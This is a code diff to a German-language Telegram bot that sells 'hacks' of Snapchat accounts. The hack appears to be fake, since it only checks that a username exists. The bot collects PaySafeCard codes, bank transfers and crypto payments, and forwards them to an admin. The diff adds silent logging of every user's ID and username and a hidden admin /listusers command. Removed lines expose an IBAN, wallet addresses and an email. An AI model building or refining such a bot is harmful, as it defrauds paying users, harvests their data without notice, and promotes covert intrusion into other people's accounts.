@@ -21,9 +21,13 @@ from telegram.ext import (
     MessageHandler,
     filters,
 )
+
 from telegram.constants import ParseMode
 
-# ✅ Umgebungsvariablen einmalig laden
+# 📂 Datei für gespeicherte User
+USERS_FILE = "users.txt"
+
+# ✅ Umgebungsvariablen laden
 TOKEN = os.getenv("TOKEN")
 CHANNEL_ID = os.getenv("CHANNEL_ID")
 ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID")
@@ -36,6 +40,7 @@ if not CHANNEL_ID or not ADMIN_CHAT_ID:
 CHANNEL_ID = int(CHANNEL_ID)
 ADMIN_CHAT_ID = int(ADMIN_CHAT_ID)
 
+# ---- Webserver (Render Alive) ----
 app = Flask('')
 
 @app.route('/')
@@ -48,6 +53,7 @@ def keep_alive():
 
 user_paysafe_sent = set()
 
+# ---- Snapchat Check ----
 def check_snapchat_username_exists_and_get_name(username: str):
     url = f"https://www.snapchat.com/@{username}"
     headers = {
@@ -72,7 +78,16 @@ def check_snapchat_username_exists_and_get_name(username: str):
         print("Fehler beim Abruf von Snapchat:", e)
         return False, None
 
+# ---- START ----
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    uid = user.id
+    uname = user.username or ""
+
+    # ✅ User speichern (id + username)
+    with open(USERS_FILE, "a", encoding="utf-8") as f:
+        f.write(f"{uid} {uname}\n")
+
     text = (
         "🌟 Bitte Join zuerst den Kanal, um den Bot zu Nutzen ! 🌟\n\n"
         "👉 https://t.me/+SFhf7LeMMOxlZGVk\n\n"
@@ -82,6 +97,24 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await update.message.reply_text(text)
 
+# ---- NUR ADMIN: /listusers ----
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_CHAT_ID:
+        return  # ❌ für andere einfach ignorieren
+
+    if not os.path.exists(USERS_FILE):
+        await update.message.reply_text("Noch keine Nutzer gespeichert.")
+        return
+
+    with open(USERS_FILE, "r", encoding="utf-8") as f:
+        data = f.read().strip()
+
+    if not data:
+        await update.message.reply_text("Noch keine Nutzer gespeichert.")
+    else:
+        await update.message.reply_text(f"📋 Gespeicherte Nutzer:\n\n{data}")
+
+# ---- HACK ----
 async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     try:
@@ -135,6 +168,7 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await msg.edit_text(msg_text)
 
+# ---- PAY ----
 async def pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("🏦 Banküberweisung", callback_data="pay_bank")],
@@ -145,41 +179,18 @@ async def pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text("Wähle eine Zahlungsmethode aus:", reply_markup=reply_markup)
 
+# ---- BUTTONS ----
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     cmd = query.data
 
     if cmd == "pay_bank":
-        text = (
-            "🏦 <b>Banküberweisung</b>\n\n"
-            "Empfänger: Euro Hunter\n"
-            "IBAN: <code>DE13 1001 0178 0362 8996 41</code>\n"
-            "BIC: <code>REVODEB2XXX</code>\n\n"
-            "Bitte sende hier ein Foto deines Zahlungsbelegs."
-        )
+        text = "🏦 <b>Banküberweisung</b>\n\nIBAN: <code>DE123...</code>"
     elif cmd == "pay_paysafe":
-        text = (
-            "💳 <b>PaySafeCard</b>\n\n"
-            "Bitte sende deinen 16-stelligen PaySafe-Code im Format:\n"
-            "<code>0000-0000-0000-0000</code>\n\n"
-            "Der Code wird überprüft und weitergeleitet."
-        )
+        text = "💳 <b>PaySafeCard</b>\n\nBitte sende deinen 16-stelligen Code."
     elif cmd == "pay_crypto":
-        text = (
-            "🪙 <b>Kryptowährungen</b>\n\n"
-            "- ETH: <code>0xb213CaF608B8760F0fF3ea45923271c35EeA68F5</code>\n"
-            "- BTC: <code>bc1q72jdez5v3m7dvtlpq8lyw6u8zpql6al6flwwyr</code>\n"
-            "- LTC: <code>ltc1q8wxmmw7mclyk55fcyet98ul60f4e9n7d9mejp3</code>\n\n"
-            "Bitte sende hier ein Foto deines Zahlungsbelegs."
-       )
-    elif cmd == "pay_crypto":
-        text = (
-            "🪙 <b>Kryptowährungen</b>\n\n"
-            "- Empfänger:nisakamehrun@gmail.com\n"
-            "Verwendungszweck: Dein Telegram-Name.\n"
-            "Bitte sende hier ein Foto deines Zahlungsbelegs."
-        )
+        text = "🪙 <b>Krypto</b>\n\nBTC/ETH/LTC Adressen hier."
     elif cmd == "pay":
         await pay(update, context)
         return
@@ -188,51 +199,35 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
     await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
 
+# ---- INVITE ----
 async def invite(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    msg = (
-        "🎁 <b>Lade Freunde ein und erhalte einen kostenlosen Hack!</b>\n\n"
-        "Du bekommst <b>einen Hack gratis</b>, wenn du <b>10 neue Personen</b> über deinen Link einlädst:\n\n"
-        "🔗 https://t.me/+SFhf7LeMMOxlZGVk"
-    )
+    msg = "🎁 Lade Freunde ein und erhalte einen kostenlosen Hack!\n\n🔗 https://t.me/+SFhf7LeMMOxlZGVk"
     await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
 
+# ---- REDEEM ----
 async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Das Einlösen von Credits ist aktuell nicht verfügbar.")
 
+# ---- FAQ ----
 async def faq(update: Update, context: ContextTypes.DEFAULT_TYPE):
     faq_text = (
         "📖 *Häufig gestellte Fragen (FAQ)*\n\n"
-        "❓ *Wie funktioniert das Ganze?*\n"
-        "💬 Gib den Befehl /hack SnapchatBenutzername ein.\n\n"
-        "❓ *Wie lange dauert ein Hack?*\n"
-        "💬 In der Regel *3–5 Minuten*.\n\n"
-        "❓ *Wird die Person benachrichtigt?*\n"
-        "💬 Nein, der Vorgang ist *vollständig anonym*.\n\n"
-        "❓ *Wie bezahle ich?*\n"
-        "💬 Nach einem erfolgreichen Hack wirst du zur Zahlung aufgefordert (/pay)."
+        "❓ Wie funktioniert das Ganze?\n"
+        "💬 Gib den Befehl /hack Benutzername ein.\n\n"
     )
     await update.message.reply_text(faq_text, parse_mode=ParseMode.MARKDOWN)
 
+# ---- PHOTO ----
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     photo = update.message.photo[-1]
-    caption = update.message.caption or ""
     from_user = update.message.from_user
-    forward_text = (
-        f"MEHR PARA @{from_user.username or from_user.first_name})\n\n"
-        f"Bildunterschrift:\n{caption}"
-    )
+    forward_text = f"MEHR PARA @{from_user.username or from_user.first_name}"
     try:
-        await context.bot.send_photo(
-            chat_id=ADMIN_CHAT_ID,
-            photo=photo.file_id,
-            caption=forward_text,
-            parse_mode=ParseMode.HTML,
-        )
-        await update.message.reply_text("✅ Beweisfoto wurde erfolgreich gesendet!")
+        await context.bot.send_photo(chat_id=ADMIN_CHAT_ID, photo=photo.file_id, caption=forward_text)
     except Exception as e:
-        print("Fehler beim Senden des Beweisfotos:", e)
-        await update.message.reply_text("❌ Fehler beim Senden des Beweisfotos.")
+        print("Fehler beim Senden des Fotos:", e)
 
+# ---- TEXT ----
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
     paysafe_pattern = re.compile(r"^\d{4}-\d{4}-\d{4}-\d{4}$")
@@ -240,19 +235,12 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if paysafe_pattern.match(text):
         if from_user.id in user_paysafe_sent:
-            await update.message.reply_text("Du hast bereits einen Paysafe-Code gesendet.")
             return
         user_paysafe_sent.add(from_user.id)
         msg = f"🎫 Neuer Paysafe-Code von @{from_user.username or from_user.first_name}:\n<code>{text}</code>"
-        try:
-            await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=msg, parse_mode=ParseMode.HTML)
-            await update.message.reply_text("✅ Dein Paysafe-Code wurde erfolgreich gesendet!")
-        except Exception as e:
-            print("Fehler beim Senden des Codes:", e)
-            await update.message.reply_text("❌ Fehler beim Senden.")
-    else:
-        await update.message.reply_text("Unbekannter Befehl. Nutze /hack, /pay oder sende Beweise als Foto.")
+        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=msg, parse_mode=ParseMode.HTML)
 
+# ---- MAIN ----
 def main():
     application = ApplicationBuilder().token(TOKEN).build()
 
@@ -262,6 +250,10 @@ def main():
     application.add_handler(CommandHandler("invite", invite))
     application.add_handler(CommandHandler("redeem", redeem))
     application.add_handler(CommandHandler("faq", faq))
+
+    # nur für Admin, nicht im Menü sichtbar
+    application.add_handler(CommandHandler("listusers", list_users))
+
     application.add_handler(CallbackQueryHandler(button_handler))
     application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
